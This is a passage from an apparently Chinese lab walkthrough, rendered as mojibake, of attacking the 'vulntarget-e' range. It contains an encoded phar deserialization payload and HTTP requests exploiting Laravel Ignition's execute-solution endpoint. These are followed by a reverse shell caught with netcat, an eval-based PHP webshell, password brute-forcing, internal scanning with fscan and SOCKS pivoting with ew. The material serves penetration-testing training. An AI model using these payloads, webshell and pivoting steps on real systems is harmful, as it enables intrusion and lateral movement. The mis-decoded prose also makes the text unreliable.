class="number">00</span>=<span class="number">4</span>F=<span class="number">00=30=00=38</span>=<span class="number">00</span>=<span class="number">36</span>=<span class="number">00</span>=<span class="number">4</span>D=<span class="number">00</span>=<span class="number">7</span><span class="keyword">A</span>=<span class="number">00=67=00=36</span>=<span class="number">00</span>=<span class="number">49</span>=<span class="number">00</span>=<span class="number">6</span>B=<span class="number">00</span>=<span class="number">6</span>C=<span class="number">00=73=00=62</span>=<span class="number">00=48=00=56</span>=<span class="number">00=74=00=61</span>=<span class="number">00=57=00=35</span>=<span class="number">00=68=00=64</span>=<span class="number">00=47=00=56</span>=<span class="number">00=63=00=51</span>=<span class="number">00</span>=<span class="number">6</span>E=<span class="number">00</span>=<span class="number">4</span><span class="keyword">A</span>=<span class="number">00=76=00=59</span>=<span class="number">00=57=00=52</span>=<span class="number">00</span>=<span class="number">6</span><span class="keyword">A</span>=<span class="number">00=59=00=58</span>=<span class="number">00</span>=<span class="number">4</span>E=<span class="number">00=30=00=61</span>=<span class="number">00=57=00=35</span>=<span class="number">00</span>=<span class="number">6</span>E=<span class="number">00=58=00=45</span>=<span class="number">00</span>=<span class="number">4</span><span class="keyword">A</span>=<span class="number">00=79=00=62</span>=<span class="number">00=32=00=46</span>=<span class="number">00</span>=<span class="number">6</span>B=<span class="number">00=59=00=32</span>=<span class="number">00</span>=<span class="number">46</span>=<span class="number">00</span>=<span class="number">7</span><span class="keyword">A</span>=<span class="number">00=64=00=45</span>=<span class="number">00=56=00=32</span>=<span class="number">00</span>=<span class="number">5</span><span class="keyword">A</span>=<span class="number">00=57=00=35</span>=<span class="number">00=30=00=49</span>=<span class="number">00</span>=<span class="number">6</span><span class="keyword">A</span>=<span class="number">00</span>=<span class="number">6</span>F=<span class="number">00</span>=<span class="number">78</span>=<span class="number">00</span>=<span class="number">4</span>F=<span class="number">00</span>=<span class="number">6</span>E=<span class="number">00</span>=<span class="number">74</span>=<span class="number">00</span>=<span class="number">7</span><span class="keyword">A</span>=<span class="number">00</span>=<span class="number">4</span>F=<span class="number">00</span>=<span class="number">6</span><span class="keyword">A</span>=<span class="number">00=45=00=77</span>=<span class="number">00</span>=<span class="number">4</span>F=<span class="number">00</span>=<span class="number">69</span>=<span class="number">00</span>=<span class="number">4</span><span class="keyword">A</span>=<span class="number">00</span>=<span class="number">6</span><span class="keyword">A</span>=<span class="number">00=62=00=32</span>=<span class="number">00=35=00=75</span>=<span class="number">00</span>=<span class="number">5</span><span class="keyword">A</span>=<span class="number">00</span>=<span class="number">57</span>=<span class="number">00</span>=<span class="number">4</span>E=<span class="number">00=30=00=61</span>=<span class="number">00=57=00=39</span>=<span class="number">00=75=00=49</span>=<span class="number">00</span>=<span class="number">6</span><span class="keyword">A</span>=<span class="number">00=74=00=50</span>=<span class="number">00</span>=<span class="number">4</span>F=<span class="number">00</span>=<span class="number">6</span><span class="keyword">A</span>=<span class="number">00</span>=<span class="number">4</span>D=<span class="number">00</span>=<span class="number">79</span>=<span class="number">00</span>=<span class="number">4</span>F=<span class="number">00</span>=<span class="number">69</span>=<span class="number">00</span>=<span class="number">4</span><span class="keyword">A</span>=<span class="number">00</span>=<span class="number">4</span>E=<span class="number">00=62=00=32</span>=<span class="number">00</span>=<span class="number">4</span>E=<span class="number">00</span>=<span class="number">72</span>=<span class="number">00</span>=<span class="number">5</span><span class="keyword">A</span>=<span class="number">00</span>=<span class="number">58</span>=<span class="number">00</span>=<span class="number">4</span><span class="keyword">A</span>=<span class="number">00=35=00=58</span>=<span class="number">00=45=00=64</span>=<span class="number">00</span>=<span class="number">6</span>C=<span class="number">00</span>=<span class="number">62</span>=<span class="number">00</span>=<span class="number">6</span>D=<span class="number">00=56=00=79</span>=<span class="number">00=59=00=58</span>=<span class="number">00=52=00=76</span>=<span class="number">00</span>=<span class="number">63</span>=<span class="number">00</span>=<span class="number">6</span>C=<span class="number">00</span>=<span class="number">78</span>=<span class="number">00</span>=<span class="number">4</span>E=<span class="number">00=62=00=32</span>=<span class="number">00</span>=<span class="number">4</span>E=<span class="number">00=72=00=52</span>=<span class="number">00=47=00=56</span>=<span class="number">00</span>=<span class="number">6</span>D=<span class="number">00=61=00=57</span>=<span class="number">00=35=00=70</span>=<span class="number">00=64=00=47</span>=<span class="number">00</span>=<span class="number">6</span>C=<span class="number">00=76=00=62</span>=<span class="number">00=69=00=49</span>=<span class="number">00</span>=<span class="number">36</span>=<span class="number">00</span>=<span class="number">4</span>D=<span class="number">00</span>=<span class="number">6</span><span class="keyword">A</span>=<span class="number">00=70=00=37</span>=<span class="number">00</span>=<span class="number">63</span>=<span class="number">00</span>=<span class="number">7</span><span class="keyword">A</span>=<span class="number">00</span>=<span class="number">6</span>F=<span class="number">00</span>=<span class="number">35</span>=<span class="number">00</span>=<span class="number">4</span>F=<span class="number">00=69=00=49</span>=<span class="number">00</span>=<span class="number">41</span>=<span class="number">00</span>=<span class="number">4</span>B=<span class="number">00=67=00=42</span>=<span class="number">00</span>=<span class="number">6</span><span class="keyword">A</span>=<span class="number">00=62=00=32</span>=<span class="number">00</span>=<span class="number">35</span>=<span class="number">00</span>=<span class="number">6</span>D=<span class="number">00=61=00=57</span>=<span class="number">00=63=00=69</span>=<span class="number">00</span>=<span class="number">4</span>F=<span class="number">00=30=00=38</span>=<span class="number">00</span>=<span class="number">36</span>=<span class="number">00</span>=<span class="number">4</span>D=<span class="number">00</span>=<span class="number">7</span><span class="keyword">A</span>=<span class="number">00=55=00=36</span>=<span class="number">00</span>=<span class="number">49</span>=<span class="number">00</span>=<span class="number">6</span>B=<span class="number">00=31=00=76</span>=<span class="number">00=59=00=32</span>=<span class="number">00</span>=<span class="number">74</span>=<span class="number">00</span>=<span class="number">6</span>C=<span class="number">00</span>=<span class="number">63</span>=<span class="number">00</span>=<span class="number">6</span>E=<span class="number">00</span>=<span class="number">6</span>C=<span class="number">00=63=00=52</span>=<span class="number">00=32=00=56</span>=<span class="number">00</span>=<span class="number">75</span>=<span class="number">00</span>=<span class="number">5</span><span class="keyword">A</span>=<span class="number">00</span>=<span class="number">58</span>=<span class="number">00</span>=<span class="number">4</span><span class="keyword">A</span>=<span class="number">00=68=00=64</span>=<span class="number">00=47=00=39</span>=<span class="number">00=79=00=58</span>=<span class="number">00=45=00=31</span>=<span class="number">00=76=00=59</span>=<span class="number">00=32=00=74</span>=<span class="number">00=44=00=62</span>=<span class="number">00=32=00=35</span>=<span class="number">00</span>=<span class="number">6</span>D=<span class="number">00=61=00=57</span>=<span class="number">00=64=00=31</span>=<span class="number">00</span>=<span class="number">63</span>=<span class="number">00</span>=<span class="number">6</span>D=<span class="number">00=46=00=30</span>=<span class="number">00=61=00=57</span>=<span class="number">00=39=00=75</span>=<span class="number">00</span>=<span class="number">49</span>=<span class="number">00</span>=<span class="number">6</span><span class="keyword">A</span>=<span class="number">00</span>=<span class="number">6</span>F=<span class="number">00</span>=<span class="number">78</span>=<span class="number">00</span>=<span class="number">4</span>F=<span class="number">00</span>=<span class="number">6</span>E=<span class="number">00</span>=<span class="number">74</span>=<span class="number">00</span>=<span class="number">7</span><span class="keyword">A</span>=<span class="number">00</span>=<span class="number">4</span>F=<span class="number">00</span>=<span class="number">6</span><span class="keyword">A</span>=<span class="number">00=63=00=36</span>=<span class="number">00=49=00=67</span>=<span class="number">00=41=00=71</span>=<span class="number">00=41=00=47</span>=<span class="number">00=35=00=68</span>=<span class="number">00=62=00=57</span>=<span class="number">00=55=00=69</span>=<span class="number">00</span>=<span class="number">4</span>F=<span class="number">00</span>=<span class="number">33</span>=<span class="number">00</span>=<span class="number">4</span>D=<span class="number">00</span>=<span class="number">36</span>=<span class="number">00</span>=<span class="number">4</span>E=<span class="number">00</span>=<span class="number">7</span><span class="keyword">A</span>=<span class="number">00</span>=<span class="number">6</span>F=<span class="number">00=69=00=59</span>=<span class="number">00</span>=<span class="number">57</span>=<span class="number">00</span>=<span class="number">4</span><span class="keyword">A</span>=<span class="number">00</span>=<span class="number">6</span><span class="keyword">A</span>=<span class="number">00</span>=<span class="number">5</span><span class="keyword">A</span>=<span class="number">00=47=00=56</span>=<span class="number">00</span>=<span class="number">6</span>D=<span class="number">00</span>=<span class="number">5</span><span class="keyword">A</span>=<span class="number">00=79=00=49</span>=<span class="number">00=37=00=66</span>=<span class="number">00</span>=<span class="number">58</span>=<span class="number">00</span>=<span class="number">4</span>D=<span class="number">00</span>=<span class="number">36</span>=<span class="number">00</span>=<span class="number">4</span>E=<span class="number">00</span>=<span class="number">7</span><span class="keyword">A</span>=<span class="number">00</span>=<span class="number">6</span>F=<span class="number">00=69=00=41</span>=<span class="number">00</span>=<span class="number">43</span>=<span class="number">00</span>=<span class="number">6</span>F=<span class="number">00=41=00=59</span>=<span class="number">00=32=00=39</span>=<span class="number">00</span>=<span class="number">6</span>B=<span class="number">00</span>=<span class="number">5</span><span class="keyword">A</span>=<span class="number">00=53=00=49</span>=<span class="number">00=37=00=63</span>=<span class="number">00</span>=<span class="number">7</span><span class="keyword">A</span>=<span class="number">00</span>=<span class="number">6</span>F=<span class="number">00</span>=<span class="number">78</span>=<span class="number">00</span>=<span class="number">4</span>D=<span class="number">00=54=00=67</span>=<span class="number">00=36=00=49</span>=<span class="number">00</span>=<span class="number">6</span><span class="keyword">A</span>=<span class="number">00</span>=<span class="number">77</span>=<span class="number">00</span>=<span class="number">2</span>F=<span class="number">00=63=00=47</span>=<span class="number">00=68=00=77</span>=<span class="number">00=49=00=48</span>=<span class="number">00</span>=<span class="number">4</span>E=<span class="number">00=35=00=63</span>=<span class="number">00=33=00=52</span>=<span class="number">00</span>=<span class="number">6</span>C=<span class="number">00=62=00=53</span>=<span class="number">00</span>=<span class="number">67</span>=<span class="number">00</span>=<span class="number">6</span>E=<span class="number">00</span>=<span class="number">63</span>=<span class="number">00</span>=<span class="number">6</span>D=<span class="number">00=30=00=67</span>=<span class="number">00</span>=<span class="number">4</span>C=<span class="number">00=33=00=52</span>=<span class="number">00=74=00=63</span>=<span class="number">00=43=00=39</span>=<span class="number">00</span>=<span class="number">6</span>D=<span class="number">00</span>=<span class="number">4</span>F=<span class="number">00=32=00=31</span>=<span class="number">00</span>=<span class="number">72</span>=<span class="number">00</span>=<span class="number">5</span><span class="keyword">A</span>=<span class="number">00</span>=<span class="number">6</span>D=<span class="number">00</span>=<span class="number">6</span>C=<span class="number">00</span>=<span class="number">6</span>D=<span class="number">00=62=00=79</span>=<span class="number">00=41=00=76</span>=<span class="number">00=64=00=47</span>=<span class="number">00=31=00=77</span>=<span class="number">00</span>=<span class="number">4</span>C=<span class="number">00=32=00=59</span>=<span class="number">00=37=00=59</span>=<span class="number">00=32=00=46</span>=<span class="number">00=30=00=49</span>=<span class="number">00=43=00=39</span>=<span class="number">00=30=00=62</span>=<span class="number">00=58=00=41</span>=<span class="number">00</span>=<span class="number">76</span>=<span class="number">00</span>=<span class="number">5</span><span class="keyword">A</span>=<span class="number">00</span>=<span class="number">6</span>E=<span class="number">00=77=00=76</span>=<span class="number">00</span>=<span class="number">59</span>=<span class="number">00</span>=<span class="number">6</span>D=<span class="number">00</span>=<span class="number">6</span>C=<span class="number">00</span>=<span class="number">75</span>=<span class="number">00</span>=<span class="number">4</span>C=<span class="number">00</span>=<span class="number">33</span>=<span class="number">00</span>=<span class="number">4</span>E=<span class="number">00</span>=<span class="number">6</span>F=<span class="number">00=49=00=43</span>=<span class="number">00=31=00=70</span>=<span class="number">00=49=00=44</span>=<span class="number">00</span>=<span class="number">49</span>=<span class="number">00</span>=<span class="number">2</span>B=<span class="number">00</span>=<span class="number">4</span><span class="keyword">A</span>=<span class="number">00</span>=<span class="number">6</span><span class="keyword">A</span>=<span class="number">00=46=00=38</span>=<span class="number">00</span>=<span class="number">62</span>=<span class="number">00</span>=<span class="number">6</span>D=<span class="number">00</span>=<span class="number">4</span>D=<span class="number">00</span>=<span class="number">67</span>=<span class="number">00</span>=<span class="number">4</span>D=<span class="number">00</span>=<span class="number">54</span>=<span class="number">00</span>=<span class="number">6</span>B=<span class="number">00</span>=<span class="number">79</span>=<span class="number">00</span>=<span class="number">4</span>C=<span class="number">00</span>=<span class="number">6</span><span class="keyword">A</span>=<span class="number">00=45=00=32</span>=<span class="number">00</span>=<span class="number">4</span>F=<span class="number">00=43=00=34</span>=<span class="number">00</span>=<span class="number">78</span>=<span class="number">00</span>=<span class="number">4</span>E=<span class="number">00=44=00=51</span>=<span class="number">00</span>=<span class="number">75</span>=<span class="number">00</span>=<span class="number">4</span>D=<span class="number">00=54=00=49</span>=<span class="number">00=34=00=49</span>=<span class="number">00</span>=<span class="number">44</span>=<span class="number">00</span>=<span class="number">6</span>B=<span class="number">00</span>=<span class="number">35</span>=<span class="number">00</span>=<span class="number">4</span>F=<span class="number">00</span>=<span class="number">54</span>=<span class="number">00</span>=<span class="number">6</span>B=<span class="number">00=67=00=50</span>=<span class="number">00=69=00=39</span>=<span class="number">00=30=00=62</span>=<span class="number">00=58=00=41</span>=<span class="number">00</span>=<span class="number">76</span>=<span class="number">00</span>=<span class="number">5</span><span class="keyword">A</span>=<span class="number">00=69=00=63</span>=<span class="number">00</span>=<span class="number">70</span>=<span class="number">00</span>=<span class="number">4</span>F=<span class="number">00=33=00=42</span>=<span class="number">00</span>=<span class="number">6</span>F=<span class="number">00=63=00=47</span>=<span class="number">00</span>=<span class="number">6</span>C=<span class="number">00</span>=<span class="number">75</span>=<span class="number">00</span>=<span class="number">5</span><span class="keyword">A</span>=<span class="number">00</span>=<span class="number">6</span>D=<span class="number">00</span>=<span class="number">38</span>=<span class="number">00</span>=<span class="number">6</span>F=<span class="number">00</span>=<span class="number">4</span>B=<span class="number">00=54=00=73</span>=<span class="number">00</span>=<span class="number">67</span>=<span class="number">00</span>=<span class="number">5</span><span class="keyword">A</span>=<span class="number">00=58=00=68</span>=<span class="number">00=70=00=64</span>=<span class="number">00=44=00=73</span>=<span class="number">00=67=00=50</span>=<span class="number">00</span>=<span class="number">7</span><span class="keyword">A</span>=<span class="number">00=34=00=69</span>=<span class="number">00</span>=<span class="number">4</span>F=<span class="number">00=33=00=31</span>=<span class="number">00=39=00=66</span>=<span class="number">00=51=00=67</span>=<span class="number">00=41=00=41</span>=<span class="number">00=41=00=42</span>=<span class="number">00</span>=<span class="number">30</span>=<span class="number">00</span>=<span class="number">5</span><span class="keyword">A</span>=<span class="number">00</span>=<span class="number">58</span>=<span class="number">00</span>=<span class="number">4</span>E=<span class="number">00</span>=<span class="number">30</span>=<span class="number">00</span>=<span class="number">4</span>C=<span class="number">00</span>=<span class="number">6</span>E=<span class="number">00=52=00=34</span>=<span class="number">00=64=00=41</span>=<span class="number">00=51=00=41</span>=<span class="number">00=41=00=41</span>=<span class="number">00=42=00=55</span>=<span class="number">00=33=00=59</span>=<span class="number">00</span>=<span class="number">56</span>=<span class="number">00</span>=<span class="number">6</span><span class="keyword">A</span>=<span class="number">00=42=00=41</span>=<span class="number">00=41=00=41</span>=<span class="number">00=41=00=41</span>=<span class="number">00</span>=<span class="number">78</span>=<span class="number">00</span>=<span class="number">2</span>B=<span class="number">00=66=00=39</span>=<span class="number">00</span>=<span class="number">69</span>=<span class="number">00</span>=<span class="number">6</span>B=<span class="number">00=41=00=51</span>=<span class="number">00=41=00=41</span>=<span class="number">00=41=00=41</span>=<span class="number">00=41=00=41</span>=<span class="number">00=41=00=48</span>=<span class="number">00</span>=<span class="number">52</span>=<span class="number">00</span>=<span class="number">6</span>C=<span class="number">00=63=00=33</span>=<span class="number">00=51=00=58</span>=<span class="number">00</span>=<span class="number">4</span>B=<span class="number">00</span>=<span class="number">7</span><span class="keyword">A</span>=<span class="number">00=69=00=57</span>=<span class="number">00</span>=<span class="number">53</span>=<span class="number">00</span>=<span class="number">2</span>F=<span class="number">00</span>=<span class="number">6</span><span class="keyword">A</span>=<span class="number">00=41=00=76</span>=<span class="number">00=55=00=64</span>=<span class="number">00</span>=<span class="number">4</span>F=<span class="number">00=41=00=44</span>=<span class="number">00=44=00=62</span>=<span class="number">00</span>=<span class="number">34</span>=<span class="number">00</span>=<span class="number">4</span>C=<span class="number">00=69=00=43</span>=<span class="number">00</span>=<span class="number">56</span>=<span class="number">00</span>=<span class="number">2</span>B=<span class="number">00</span>=<span class="number">66</span>=<span class="number">00</span>=<span class="number">6</span>D=<span class="number">00=74=00=77</span>=<span class="number">00=49=00=41</span>=<span class="number">00=41=00=41</span>=<span class="number">00=42=00=48</span>=<span class="number">00</span>=<span class="number">51</span>=<span class="number">00</span>=<span class="number">6</span>B=<span class="number">00=31=00=43</span>=<span class="number">00</span>a&quot;</span></span><br><span class="line"><span class="dns">  &#125;</span></span><br><span class="line"><span class="dns">&#125;</span></span><br></pre></td></tr></table></figure><p><img src="/images/vulntarget-e/image-20221129201330580.png" alt="image-20221129201330580"></p><p>å‘é€å¦‚ä¸‹æ•°æ®åŒ…ï¼Œæ¸…ç©ºå¯¹logæ–‡ä»¶ä¸­çš„å¹²æ‰°å­—ç¬¦ï¼Œåªç•™ä¸‹POCï¼šè¿”å›200</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/_ignition/execute-solution</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>192.168.144.55</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/json</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>299</span><br><span class="line"></span><br><span class="line"><span class="json">&#123;</span></span><br><span class="line"><span class="json">  <span class="attr">&quot;solution&quot;</span>: <span class="string">&quot;Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution&quot;</span>,</span></span><br><span class="line"><span class="json">  <span class="attr">&quot;parameters&quot;</span>: &#123;</span></span><br><span class="line"><span class="json">    <span class="attr">&quot;variableName&quot;</span>: <span class="string">&quot;username&quot;</span>,</span></span><br><span class="line"><span class="json">    <span class="attr">&quot;viewFile&quot;</span>: <span class="string">&quot;php://filter/write=convert.quoted-printable-decode|convert.iconv.utf-16le.utf-8|convert.base64-decode/resource=../storage/logs/laravel.log&quot;</span></span></span><br><span class="line"><span class="json">  &#125;</span></span><br><span class="line"><span class="json">&#125;</span></span><br></pre></td></tr></table></figure><p><img src="/images/vulntarget-e/image-20221129201505852.png" alt="image-20221129201505852"></p><p>ä½¿ç”¨phar://è¿›è¡Œååºåˆ—åŒ–ï¼Œæ‰§è¡Œä»»æ„ä»£ç ï¼ˆæœ‰çš„æ–‡ç« è¯´ç›¸å¯¹è·¯å¾„ï¼Œæœ‰çš„ç»å¯¹è·¯å¾„ï¼Œè¿™é‡Œç¬”è€…è§‰å¾—è¿˜æ˜¯ç›¸å¯¹è·¯å¾„å¥½ç”¨ï¼Œç»å¯¹è·¯å¾„æ²¡å‡ºï¼Œå¦‚æœæƒ³ç”¨ç»å¯¹è·¯å¾„ï¼Œä¸Šé¢500æŠ¥é”™å“ªé‡Œæœ‰è·¯å¾„ï¼Œæˆ‘ä»¬è¿™é‡Œä½¿ç”¨ç›¸å¯¹å§ï¼‰ï¼šè¿™é‡Œè¦å…ˆncç›‘å¬ä¸€ä¸‹<br><code>nc -lvnp 9999</code>shellå°±è¿‡æ¥äº†ï¼Œ</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/_ignition/execute-solution</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>192.168.144.55</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/json</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>204</span><br><span class="line"></span><br><span class="line"><span class="json">&#123;</span></span><br><span class="line"><span class="json">  <span class="attr">&quot;solution&quot;</span>: <span class="string">&quot;Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution&quot;</span>,</span></span><br><span class="line"><span class="json">  <span class="attr">&quot;parameters&quot;</span>: &#123;</span></span><br><span class="line"><span class="json">    <span class="attr">&quot;variableName&quot;</span>: <span class="string">&quot;username&quot;</span>,</span></span><br><span class="line"><span class="json">    <span class="attr">&quot;viewFile&quot;</span>: <span class="string">&quot;phar://../storage/logs/laravel.log/test.txt&quot;</span></span></span><br><span class="line"><span class="json">  &#125;</span></span><br><span class="line"><span class="json">&#125;</span></span><br></pre></td></tr></table></figure><p><img src="/images/vulntarget-e/image-20221129201932533.png" alt="image-20221129201932533"></p><p>è¿™é‡Œæˆ‘ä»¬å°±æ‹¿åˆ°shelläº†ï¼Œä½†æ˜¯ä¼ æ–‡ä»¶å¯èƒ½ä¸å¤ªå¥½ç”¨ï¼Œè¦åå‘ä¸‹è½½ï¼Œæˆ‘ä»¬è¿™é‡Œåˆ°webè·Ÿè·¯å¾„å†™ä¸ªğŸåé¢æ–¹ä¾¿ä¼ æ–‡ä»¶ä¸‹è½½å•¥çš„ã€‚éœ€è¦æ³¨æ„ï¼Œè¿™ä¸ªæ‰§è¡Œå°±åªèƒ½æ‰§è¡Œä¸€æ¬¡ï¼Œä¸Šé¢å·²ç»è¯´è¿‡äº†ï¼Œæ—¥å¿—æ–‡ä»¶ä¼šè¢«è¦†ç›–ï¼Œæ‰€ä»¥å¦‚æœæ²¡æ‰“æˆåŠŸå°±è¦é‡æ–°æ¥ä¸€éï¼Œè€Œä¸”ç¬¬ä¸€æ¬¡æ¸…ç©ºæ—¥å¿—çš„æ—¶å€™ä¸€å®šè¦è¿”å›200æ‰ç®—æ¸…ç©ºæˆåŠŸã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /var/www/html/public</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;&lt;?php eval($_POST[g]);?&gt;&#x27;</span> &gt; a.php</span><br><span class="line">cat a.php</span><br><span class="line">http://192.168.144.55/a.php</span><br><span class="line">g</span><br></pre></td></tr></table></figure><p><img src="/images/vulntarget-e/image-20221129203359747.png" alt="image-20221129203359747"></p><p>ä¿¡æ¯æ”¶é›†ä¸€æ³¢ï¼Œç¯å¢ƒå¹¶æ²¡æœ‰è£…net-toolsï¼Œæ²¡æœ‰ifconfig ï¼Œæ‰€ä»¥æˆ‘ä»¬<code>ip a</code> ä¹Ÿå¯ä»¥æŸ¥çœ‹ipï¼Œä¸¤å—ç½‘å¡ï¼Œå†…ç½‘è¿˜æœ‰ä¸€ä¸ª20çš„æ®µ</p><p><img src="/images/vulntarget-e/image-20221129203818846.png" alt="image-20221129203818846"></p><p>ç„¶åä¸Šä¸ªlse æˆ–è€…linux-exploit-suggester-master è¿›è¡Œææƒä¸€ä¸‹ï¼Œå½“ç„¶ä¸æä¹Ÿæ²¡å…³ç³»ï¼Œä¸å½±å“åé¢ã€‚è¿™é‡Œç¬”è€…æŠŠä¸Šé¢ä¸¤ä¸ªææƒè¾…åŠ©å·¥å…·éƒ½è·‘äº†ä¸€ä¸‹ï¼Œå¹¶æ²¡æœ‰å‘ç°ä»€ä¹ˆå¥½çš„ææƒæ–¹æ³•ï¼Œçœ‹äº†çœ¼wpï¼Œè¯´æœ‰å¼±å£ä»¤ã€‚é‚£è‚¯å®šæ˜¯çœ‹passwdæ–‡ä»¶ï¼ŒçŸ¥é“ç”¨æˆ·å<code>vulntarget</code>ï¼Œç„¶åçˆ†ç ´ä¸€ä¸‹ã€‚</p><p><img src="/images/vulntarget-e/image-20221129211426271.png" alt="image-20221129211426271"></p><p>é‚£è¿™æ ·çš„è¯ï¼Œè¿ä¸Šå»å°±å¯ä»¥äº†ã€‚æˆ‘ä»¬è¿™é‡Œè¿˜æ˜¯ç”¨èšå‰‘å§</p><p><img src="/images/vulntarget-e/image-20221129213522722.png" alt="image-20221129213522722"></p><p>./fscan_amd64 -h 10.0.20.141/24 -o a.txt</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">./fscan_amd64 -h 10.0.20.141/24 -o a.txt</span><br><span class="line">10.0.20.141:80 open</span><br><span class="line">10.0.20.141:22 open</span><br><span class="line">[*] WebTitle:http://10.0.20.141        code:200 len:7      title:Laravel</span><br><span class="line">[+] InfoScan:http://10.0.20.141        [Laravel] </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ä¼¼ä¹å¹¶æ²¡æœ‰æ‰«åˆ°å†…ç½‘ï¼Œå› ä¸ºè¿™å°æ˜¯winçš„æœºå™¨ï¼Œå¯èƒ½æ˜¯é˜²ç«å¢™çš„ä½œç”¨ã€‚æˆ‘ä»¬åŠ ä¸ªnp ç¦pingæ‰«</span><br><span class="line"></span><br><span class="line">./fscan_amd64 -h 10.0.20.141/24 -pn -o s.txt</span><br><span class="line">10.0.20.141:22 open</span><br><span class="line">10.0.20.100:80 open</span><br><span class="line">10.0.20.141:80 open</span><br><span class="line">10.0.20.100:443 open</span><br><span class="line">[*] WebTitle:https://10.0.20.100       code:403 len:301    title:403 Forbidden</span><br><span class="line">[*] WebTitle:http://10.0.20.141        code:200 len:7      title:Laravel</span><br><span class="line">[+] InfoScan:http://10.0.20.141        [Laravel] </span><br><span class="line">[*] WebTitle:http://10.0.20.100        code:200 len:42     title:Online Veterinary Appointment System - PHP</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°è¿˜æœ‰ä¸€ä¸ª100çš„æœºå™¨ï¼Œä¸”å¼€äº†80å¹¶ä¸”æ˜¯ä¸€ä¸ªwinserver,æŒ‚ä»£ç†è®¿é—®</p><p>é‚£ä¹ˆç›´æ¥ä¸Šä»£ç†ï¼Œè¿™é‡Œç¬”è€…ä¸Šewï¼ŒæŠŠå†…ç½‘å¸¦å‡ºæ¥ã€‚æ‹–ä¸ªewä¸Šå»ï¼Œæ”¹ä¸€ä¸‹777æƒé™.å½“ç„¶å…¶ä»–ä»£ç†è½¯ä»¶ä¹Ÿè¡Œï¼Œä¸å”¯ä¸€</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./ew_for_linux64 -s ssocksd -l 8887</span><br></pre></td></tr></table></figure><p><img src="/images/vulntarget-e/image-20221129215012297.png" alt="image-20221129215012297"></p><p><img src="/images/vulntarget-e/image-20221129215310468.png" alt="image-20221129215310468"></p><p>ç”¨proxifieråŠ ä¸ªserversåœ°å€å†™å¤–ç½‘åœ°å€ï¼Œç«¯å£å†™ä»£ç†ç«¯å£</p><p>æ–°åŠ ä¸€ä¸ªè§„åˆ™ï¼Œæˆ‘ä»¬å†™é€šå¾€20çš„æ®µï¼Œèµ°ä»£ç†</p><p><img src="/images/vulntarget-e/image-20221129215644648.png" alt="image-20221129215644648"></p><p><img src="/images/vulntarget-e/image-20221129215733868.png" alt="image-20221129215733868"></p><p>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°èƒ½æˆåŠŸè®¿é—®20æ®µipäº†ã€‚</p><p>è®°ä¸€ä¸ªå‘ï¼šæˆ‘åœ¨ä¸Šå®Œewåå¯åŠ¨äº†ä¹‹åä½¿ç”¨è°·æ­Œå¸¦çš„é‚£ä¸ªæ’ä»¶[SwitchyOmega] ä¹ŸåŠ äº†ä¸€ä¸ªä»£ç†ï¼Œç„¶åå»è®¿é—®è¿™ä¸ªç½‘ç«™ï¼Œå‰å‡ æ¬¡è¿˜è¡Œï¼Œä¸‰äº”æ¡è®¿é—®ä¹‹åè¿™ä¸ªé“¾è·¯å°±æŒ‚äº†ï¼Œ</p><p>linuxä¸­ewæŠ¥<code>Segmentation fault (core dumped)</code> å…ˆå¼€å§‹æˆ‘ä»¥ä¸ºæ˜¯ewç‰ˆæœ¬ä¸å¯¹æˆ–è€…èšå‰‘æ‰§è¡Œå‘½ä»¤çš„é—®é¢˜ï¼Œå› ä¸ºä»¥å‰æ²¡æœ‰å‡ºç°è¿‡è¿™ä¸ªæƒ…å†µï¼Œæˆ‘åˆå»shellé‡Œæµ‹äº†ä¸€ä¸‹ï¼Œå‘ç°ï¼Œæµè§ˆå™¨å¯èƒ½æœ‰æ’ä»¶å¯èƒ½ä¼šè®¿é—®è°·æ­Œæˆ–è€…å…¶ä»–å¤–ç½‘ï¼Œç„¶åå°±åœæ‰äº†ã€‚æˆ‘ç”¨äº†proxifieråªåŠ ç›®æ ‡åœ°å€æ®µæ²¡æœ‰å‡ºç°ä»»ä½•é—®é¢˜ã€‚å¯èƒ½æ˜¯è®¿é—®å¤–ç½‘çš„åŸå› ã€‚æ²¡å…³ç³»ï¼Œè§£å†³äº†å°±å¥½äº†</p><p><img src="/images/vulntarget-e/image-20221129221150992.png" 